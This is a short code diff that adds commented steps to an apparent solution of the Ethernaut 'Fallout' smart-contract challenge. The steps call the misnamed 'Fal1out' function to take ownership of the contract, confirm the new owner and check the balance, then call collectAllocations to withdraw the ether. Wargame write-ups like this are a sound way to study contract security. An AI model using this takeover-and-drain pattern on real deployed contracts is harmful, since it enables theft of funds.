@@ -44,12 +44,17 @@ contract Fallout {
 
 // Contract instance: "0xc1781F372ecD3440c19a9D800A0988d1104b377e"
 
+// Contract Balance
 // web3.eth.getBalance("0xc1781F372ecD3440c19a9D800A0988d1104b377e") => "0"
 
+// Use Fal1out function to become the owner -- missing the onlyOwner modifier
 // contract.Fal1out({value: toWei("0.1")}) => tx: "0x85264283f8596ba4cd951856f3c923825c64095aa9d37619279c5f8d9b72fd73"
 
+// Check contract owner again -- it's me =)
 // await contract.owner() => '0x319d567611c5a1017BA081e2B27B7c7b57e1797d'
 
+// Check eth balance of contract
 // await web3.eth.getBalance("0xc1781F372ecD3440c19a9D800A0988d1104b377e") => '100000000000000000'
 
+// Withdraw eth from contract
 // await contract.collectAllocations()
